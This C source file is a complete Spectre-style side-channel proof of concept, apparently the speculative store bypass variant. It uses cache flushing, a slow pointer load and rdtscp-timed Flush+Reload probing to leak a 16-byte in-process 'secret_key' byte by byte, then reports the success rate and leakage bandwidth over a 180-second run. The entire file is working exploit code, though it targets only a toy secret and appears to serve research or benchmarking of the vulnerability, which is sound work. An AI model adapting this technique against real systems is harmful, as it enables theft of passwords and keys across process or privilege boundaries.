#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <time.h>

#define LEN 16
#define MAX_TRIES 20
#define CACHE_HIT_THRESHOLD 80

unsigned char** memory_slot_ptr[256];
unsigned char* memory_slot[256];

unsigned char secret_key[] = "PASSWORD_SPECTRE";
unsigned char public_key[] = "################";

uint8_t probe[256 * 4096];
volatile uint8_t tmp = 0;

void victim_function(size_t idx) {
    unsigned char **memory_slot_slow_ptr = *memory_slot_ptr;
    *memory_slot_slow_ptr = public_key;
    tmp = probe[(*memory_slot)[idx] * 4096];
}

int attacker_function() {
    char password[LEN + 1] = {'\0'};
    int success_count = 0;

    for (int idx = 0; idx < LEN; ++idx) {
        int results[256] = {0};
        unsigned int junk = 0;

        for (int tries = 0; tries < MAX_TRIES; tries++) {
            *memory_slot_ptr = memory_slot;
            *memory_slot = secret_key;

            _mm_clflush(memory_slot_ptr);
            for (int i = 0; i < 256; i++) {
                _mm_clflush(&probe[i * 4096]);
            }

            _mm_mfence();

            victim_function(idx);

            for (int i = 0; i < 256; i++) {
                volatile uint8_t* addr = &probe[i * 4096];
                uint64_t time1 = __rdtscp(&junk); // read timer
                junk = *addr; // memory access to time
                uint64_t time2 = __rdtscp(&junk) - time1; // read timer and compute elapsed time

                if (time2 <= CACHE_HIT_THRESHOLD && i != public_key[idx]) {
                    results[i]++; // cache hit
                }
            }
        }
        tmp ^= junk; // use junk so code above won’t get optimized out

        int highest = -1;
        for (int i = 0; i < 256; i++) {
            if (highest < 0 || results[highest] < results[i]) {
                highest = i;
            }
        }
        if (highest == secret_key[idx]) {
            success_count++;
        }
        password[idx] = highest;
    }

    // Optionally print password for debugging
    // printf("Recovered password: %s\n", password);
    return success_count;
}

int main(void) {
    for (int i = 0; i < sizeof(probe); ++i) {
        probe[i] = 1; // write to array2 so in RAM not copy-on-write zero pages
    }

    time_t start_time = time(NULL);
    int total_success_count = 0;
    int iterations = 0;
    double run_time_seconds = 180.0; // Set the total run time here (in seconds)

    while (difftime(time(NULL), start_time) < run_time_seconds) {
        total_success_count += attacker_function();
        iterations++;
    }

    double total_elapsed_time = difftime(time(NULL), start_time);
    double success_rate = (double)total_success_count / (LEN * iterations);
    double bandwidth = (total_success_count / total_elapsed_time);

    printf("Success rate: %.2f%%\n", success_rate * 100);
    printf("Bandwidth: %.2f characters per second\n", bandwidth);

    return 0;
}
